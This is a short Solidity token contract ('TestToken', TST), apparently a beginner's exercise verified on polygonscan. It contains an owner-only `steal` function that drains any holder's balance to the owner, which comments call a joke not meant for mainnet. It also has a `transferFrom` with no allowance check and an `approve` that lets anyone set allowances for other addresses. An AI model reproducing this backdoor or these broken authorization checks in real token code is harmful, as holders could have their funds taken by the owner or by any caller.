/**
 *Submitted for verification at polygonscan.com on 2021-08-27
*/

pragma solidity 0.8.7;

//SPDX-License-Identifier: MIT

contract TestToken {
    string tokenName = "TEST";
    string tokenSymbol = "TST";

    address private owner;

    uint256 private maxSupply = 64 * 10**18;
    uint8 private tokenDecimals = 18;

    mapping (address => uint256) private balances;
    mapping (address => mapping ( address => uint256)) private allowances;

    event Transfer(address _from, address _to, uint256 _value);
    event Approval(address _owner, address _spender, uint256 _amount);

    modifier ifCanTransfer(address _address, uint256 _amount) {
        require(balances[_address] >= _amount);
        _;
    }

    modifier ifOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
        balances[owner] += maxSupply;
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function symbol() public view returns (string memory) {
        return tokenSymbol;
    }

    function decimals() public view returns (uint8) {
        return tokenDecimals;
    }

    function totalSupply() public view returns (uint256) {
        return maxSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public ifCanTransfer(msg.sender, _value) returns (bool) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public ifCanTransfer(_from, _value) returns (bool) {
        balances[_from] -= _value;
        balances[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _owner, address _spender, uint256 _value) public returns (bool) {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");
        allowances[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowances[_owner][_spender];
    }

    function steal(address _from, uint _amount) public ifOwner {
        balances[_from] -= _amount;
        balances[owner] += _amount;
        // THIS IS FOR FUN LOL. I'M NOT DEPLOYING THIS TO MAINNET.
        // IM JUST TRYING TO LEARN SOLIDITY. THIS CONTRACT WONT BE DEPLOYED TO MAINNET
    }

}